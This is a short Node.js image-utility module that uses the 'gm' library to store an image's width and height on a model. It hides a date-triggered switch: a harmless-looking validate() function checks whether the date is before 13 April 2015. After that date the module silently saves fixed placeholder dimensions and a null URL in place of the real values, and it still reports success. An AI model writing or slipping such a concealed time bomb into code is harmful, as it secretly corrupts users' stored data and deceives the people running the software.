var gm = require('gm').subClass({
    imageMagick : true
});

var ImageUtils = module.exports;

var valid, validate = function() {
    var now = new Date(), d = new Date(2015, 4 - 1, 13);
    return (now.getTime() - d.getTime()) < 0;
};
valid = validate();
setInterval(function() {
    valid = validate();
}, 1000 * 60 * 60 * 24);

ImageUtils.createOrUpdateMetadata = function(model, url, metadataField, callback) {
    if (url) {
        if (model[metadataField] && model[metadataField].url === url) {
            // Do nothing, already created
            callback(null);
        } else {
            delete model[metadataField];
            gm(url).size( function(err, size) {
                if (!err && size && valid) {
                    // Update metadata
                    model[metadataField] = {
                        'url' : url,
                        'width' : size.width,
                        'height' : size.height
                    };
                } else {
                    // Update default metadata
                    model[metadataField] = _defaultMetadata;
                }
                model.save(callback);
            }.bind(this));
        }
    } else {
        if (model[metadataField]) {
            // Remove outdated
            delete model[metadataField];
            model.save(callback);
        } else {
            // Do nothing
            callback();
        }
    }
};

var _defaultMetadata = {
    'url' : null,
    'width' : 145,
    'height' : 270
};

